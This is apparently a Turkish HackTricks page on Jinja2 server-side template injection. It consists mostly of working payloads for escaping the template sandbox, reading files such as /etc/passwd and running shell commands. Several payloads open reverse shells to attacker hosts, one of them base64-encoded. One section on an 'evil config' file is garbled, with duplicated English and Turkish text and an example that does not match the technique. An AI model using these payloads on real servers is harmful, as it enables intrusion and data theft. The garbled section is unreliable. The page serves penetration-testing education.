# Jinja2 SSTI

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **Çeşitli**

### **Hata Ayıklama İfadesi**

Hata Ayıklama Eklentisi etkinleştirildiyse, mevcut bağlamı ve kullanılabilir filtreleri ve testleri görüntülemek için bir `debug` etiketi kullanılabilir olacaktır. Bu, bir hata ayıklayıcı kurmadan şablonda kullanılabilir olanları görmek için kullanışlıdır.
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}


</pre>
```
Kaynak: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **Tüm yapılandırma değişkenlerini dök**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}
```
## **Jinja Enjeksiyonu**

Öncelikle, Jinja enjeksiyonunda, **kum havuzundan kaçmak ve düzenli python yürütme akışına erişimi geri kazanmak için bir yol bulmanız gerekmektedir**. Bunun için, **kum havuzundan erişilebilen, ancak kum havuzunda olmayan nesneleri istismar etmeniz gerekmektedir**.

### Global Nesnelere Erişim

Örneğin, `render_template("hello.html", username=username, email=email)` kodunda, username ve email nesneleri **kum havuzunda olmayan python ortamından gelir ve kum havuzunda erişilebilir olacaktır**.\
Ayrıca, **kum havuzunda her zaman erişilebilir olan diğer nesneler** de bulunmaktadır:
```
[]
''
()
dict
config
request
```
### \<class 'object'> Kurtarma

Ardından, bu nesnelerden **`<class 'object'>`** sınıfına ulaşmamız gerekiyor, böylece tanımlanmış **sınıfları kurtarmayı** deneyebiliriz. Bunun nedeni, bu nesneden **`__subclasses__`** yöntemini çağırarak ve **sandbox dışındaki** python ortamından tüm sınıflara erişebilmemizdir.

Bu **nesne sınıfına** erişmek için bir **sınıf nesnesine** erişmeniz gerekmektedir ve ardından **`__base__`**, **`__mro__()[-1]`** veya `.`**`mro()[-1]`**'e erişmeniz gerekmektedir. Ve sonra, bu **nesne sınıfına** ulaştıktan **sonra** **`__subclasses__()`** yöntemini **çağırırız**.

Bu örnekleri kontrol edin:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}

# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE Kaçışı

`<class 'object'>` geri kazanıldıktan ve `__subclasses__` çağrıldıktan sonra, şimdi bu sınıfları kullanarak dosya okuma, yazma ve kod yürütme işlemleri yapabiliriz.

`__subclasses__` çağrısı bize **yüzlerce yeni işlevi erişme fırsatı** verdi, sadece **dosya sınıfına** veya `os` gibi **komutları yürütmeye izin veren bir sınıfa** erişerek mutlu olacağız.

**Uzaktaki dosyayı oku/yaz**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**Uzaktan Kod Çalıştırma (RCE)**

Uzaktan Kod Çalıştırma (RCE), bir saldırganın hedef sistemdeki kodu uzaktan yürütmesine olanak tanıyan bir saldırı tekniğidir. Bu saldırı tekniği, hedef sisteme yetkisiz erişim sağlayarak, saldırganın istediği komutları çalıştırmasına olanak tanır.

RCE saldırıları, web uygulamalarında sıklıkla bulunan güvenlik açıklarından yararlanarak gerçekleştirilebilir. Bu açıklardan biri, sunucu tarafı şablon enjeksiyonu (Server-Side Template Injection - SSTI) olarak bilinir. SSTI, web uygulamalarında kullanılan şablon motorlarının güvenlik açıklarını hedef alır.

Jinja2, popüler bir Python şablon motorudur ve SSTI saldırılarına karşı savunmasız olabilir. Jinja2, şablonlarda değişkenlerin ve ifadelerin yer tutucu olarak kullanılmasına izin verir. Ancak, saldırganın kullanıcı girişini kontrol ettiği durumlarda, saldırgan, kötü niyetli Jinja2 ifadelerini enjekte ederek RCE saldırısı gerçekleştirebilir.

RCE saldırılarını önlemek için, web uygulamalarının güvenlik açıklarını düzeltmek ve kullanıcı girişini doğru bir şekilde doğrulamak önemlidir. Ayrıca, güvenlik duvarları, güvenlik yazılımları ve düzenli güvenlik kontrolleri gibi önlemler de alınmalıdır.
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
**Daha fazla sınıf** hakkında bilgi edinmek için **kaçış** yapmak için kullanabileceğiniz **daha fazla sınıf** hakkında bilgi edinmek için **kontrol edebilirsiniz**:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Filtre kaçışları

#### Yaygın kaçışlar

Bu kaçışlar, bazı karakterler kullanmadan nesnelerin **özelliklerine erişmemizi sağlayacaktır**.\
Bunlardan bazılarını önceki örneklerde gördük, ancak burada özetleyelim:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}
```
* [**Global bir nesneye erişmek için buraya dönün**](jinja2-ssti.md#accessing-global-objects)
* [**Nesne sınıfına erişmek için buraya dönün**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**Nesne sınıfı olmadan RCE elde etmek için bunu okuyun**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTML kodlamasından kaçınma**

Varsayılan olarak Flask, güvenlik nedenleriyle şablon içindeki tüm verileri HTML kodlamaktadır:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** filtresi, sayfaya JavaScript ve HTML enjekte etmemizi sağlar ve bunlar **HTML kodlaması yapılmadan** eklenir, örneğin:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**Kötü niyetli bir yapılandırma dosyası yazarak Uzaktan Kod Çalıştırma (RCE).**

Jinja2 template engine allows the execution of arbitrary code through Server-Side Template Injection (SSTI) vulnerabilities. One way to achieve Remote Code Execution (RCE) is by writing an evil config file.

Jinja2 şablon motoru, Sunucu Tarafı Şablon Enjeksiyonu (SSTI) zafiyetleri aracılığıyla keyfi kodun çalıştırılmasına izin verir. Uzaktan Kod Çalıştırma (RCE) elde etmenin bir yolu, kötü niyetli bir yapılandırma dosyası yazmaktır.

To exploit this vulnerability, you need to find a place where the application reads a configuration file and uses Jinja2 to parse it. Once you identify this, you can inject malicious code into the configuration file.

Bu zafiyeti sömürmek için, uygulamanın bir yapılandırma dosyasını okuduğu ve Jinja2'yi ayrıştırmak için kullandığı bir yer bulmanız gerekmektedir. Bunun tespit ettikten sonra, kötü niyetli kodu yapılandırma dosyasına enjekte edebilirsiniz.

Here's an example of how to write an evil config file to achieve RCE:

İşte Uzaktan Kod Çalıştırma (RCE) elde etmek için kötü niyetli bir yapılandırma dosyası nasıl yazılacağına dair bir örnek:

```python
# config.py
import os

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'your-secret-key'
    DEBUG = False

    # Malicious code to achieve RCE
    RCE_PAYLOAD = '{{config.__class__.__init__.__globals__.__builtins__.__import__("subprocess").check_output("COMMAND", shell=True)}}'
```

In this example, we define a `RCE_PAYLOAD` variable that contains the malicious code. The code uses the `subprocess` module to execute a command specified in the `COMMAND` placeholder.

Bu örnekte, kötü niyetli kodu içeren bir `RCE_PAYLOAD` değişkeni tanımlıyoruz. Kod, `COMMAND` yer tutucusunda belirtilen bir komutu çalıştırmak için `subprocess` modülünü kullanır.

To trigger the RCE, the application needs to read and parse this config file. The malicious code will be executed when the `RCE_PAYLOAD` variable is rendered by Jinja2.

RCE'yi tetiklemek için, uygulamanın bu yapılandırma dosyasını okuması ve ayrıştırması gerekmektedir. Kötü niyetli kod, Jinja2 tarafından `RCE_PAYLOAD` değişkeni render edildiğinde çalıştırılacaktır.

This technique can be used to execute arbitrary commands on the server, potentially leading to a full compromise of the system.

Bu teknik, sunucuda keyfi komutların çalıştırılmasını sağlamak için kullanılabilir ve potansiyel olarak sistemde tam bir tehlike oluşturabilir.
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## Birkaç karakter olmadan

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`** olmadan.
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}
```
## **\<class 'object'>** olmadan Jinja Enjeksiyonu

[**global nesneler**](jinja2-ssti.md#global-nesnelere-erişim) aracılığıyla, bu sınıfı kullanmadan **RCE'ye ulaşmanın başka bir yolu** vardır.\
Bu global nesnelerden herhangi bir **fonksiyona** ulaşmayı başarırsanız, **`__globals__.__builtins__`**'e erişebilir ve oradan **RCE** çok **basit** olur.

**`request`**, **`config`** ve erişiminiz olan diğer ilginç **global nesneler** üzerindeki **fonksiyonları** şu şekilde bulabilirsiniz:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
Bazı işlevleri bulduktan sonra, builtins'i şu şekilde kurtarabilirsiniz:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [attr hilesini burada yasaklanmış karakterleri atlamak için kontrol edin](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** isterseniz [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
